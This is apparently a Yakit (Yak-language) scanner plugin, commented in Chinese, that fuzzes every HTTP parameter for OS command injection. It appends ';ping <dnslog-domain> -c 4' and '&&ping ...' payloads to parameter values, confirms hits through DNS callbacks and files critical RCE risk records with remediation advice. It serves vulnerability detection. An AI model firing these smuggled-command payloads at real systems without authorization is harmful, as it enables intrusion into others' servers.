mirrorFilteredHTTPFlow = func(isHttps /* bool */, url /* string */, req /* []byte */, rsp /* []byte */, body /* []byte */) {
    // println("hello world1")
    freq, err = fuzz.HTTPRequest(req, fuzz.https(isHttps))
    die(err)
    host, port, _ = str.ParseStringToHostPort(url)
    addr = str.HostPort(host, port)

    // 获取所有参数进行测试
    params = freq.GetCommonParams()

    getpa = string(params)
    paths222 = ""

    // 去重机制
    if poc.GetHTTPRequestPath(req).Split("/")[-1] == "" {
        paths222 = poc.GetHTTPRequestPath(req)
        paths222 += addr
        paths222 += getpa
        println(paths222)
        paths222 = codec.Md5(paths222)
    } else {
        paths222 = poc.GetHTTPRequestPath(req)
        paths222 += addr
        paths222 += getpa
        println(paths222)
        paths222 = codec.Md5(paths222)
    }

    if db.GetProjectKey(paths222) == "fuzz-rce5" {
        println("重复扫描，已跳过")
        return
    } else {
        db.SetProjectKey(paths222, "fuzz-rce5")
    }



    for i = 0; i < len(params); i++ {
        param = params[i]
        paramName = param.Name()
        originalValue = param.Value()

        yakit.Info("测试参数：" + paramName)

        // 创建DNS Log域名和token
        domain, token, err = risk.NewDNSLogDomain()
        if err {
            yakit.Error("创建DNS Log域名失败: %v", err)
            continue
        }

        payloads = [
            sprintf("%s;ping %s -c 4", originalValue, domain),     // 分号分隔
            sprintf("%s&&ping %s -c 4", originalValue, domain),   // AND操作符  
        ]

        // 测试每个payload
        for j = 0; j < len(payloads); j++ {
            payloadStr = payloads[j]  // 这是字符串类型的payload
            yakit.Info("参数 %s 测试payload[%d]: %s", paramName, j+1, payloadStr)

            // 对参数进行Fuzz测试
            testResp, err = param.Fuzz(payloadStr).ExecFirst()
            if err {
                yakit.Error("参数 %s payload[%d] 测试请求失败: %v", paramName, j+1, err)
                continue
            }

            yakit.Info("参数 %s payload[%d] 请求已发送，等待DNS回连...", paramName, j+1)

            // 等待5秒并检查DNS回连结果
            time.Sleep(5)
            results, err = risk.CheckDNSLogByToken(token, 5)
            if err {
                yakit.Error("检查DNS Log失败: %v", err)
                continue
            }

            // 如果有DNS回连记录，说明存在命令执行漏洞
            if len(results) > 0 {
                yakit.Error("发现命令执行漏洞！参数: %s, payload: %s", paramName, payloadStr)

                // 创建风险记录
                risk.NewRisk(url, 
                    risk.title(sprintf("【严重】目标 `%s` 参数 `%s` 存在命令执行漏洞", url, paramName)),
                    risk.type("rce"),
                    risk.request(testResp.RequestRaw),
                    risk.response(testResp.ResponseRaw),
                    risk.level("critical"),
                    risk.payload(string(payloadStr)),  // 使用字符串类型的payloadStr
                    risk.parameter(paramName),
                    risk.description(sprintf(
                        "【确认漏洞】通过DNS回连技术确认存在远程命令执行漏洞\n\n" +
                        "攻击详情：\n" +
                        "• 目标URL: %s\n" +
                        "• 漏洞参数: %s\n" +
                        "• 原始参数值: %s\n" +
                        "• 注入payload: %s\n" +
                        "• DNS回连域名: %s\n" +
                        "• 成功回连次数: %d\n\n" +
                        "风险评估：此漏洞允许攻击者在服务器上执行任意系统命令，属于最高危险等级。",
                        url, paramName, originalValue, payloadStr, domain, len(results))),
                    risk.solution("【紧急修复措施】\n1. 立即停止使用不安全的系统命令调用\n2. 对所有用户输入进行严格验证和过滤\n3. 使用白名单机制限制可执行的命令\n4. 实施最小权限原则\n5. 部署WAF进行应急防护"),
                )

                // 找到漏洞后跳出payload循环，避免重复报告
                break
            } else {
                yakit.Info("参数 %s payload[%d] 未触发DNS回连", paramName, j+1)
            }

            // 每个payload测试间隔1秒，避免请求过于频繁
            time.Sleep(2)
        }
    }

    // println("hello world2")
}
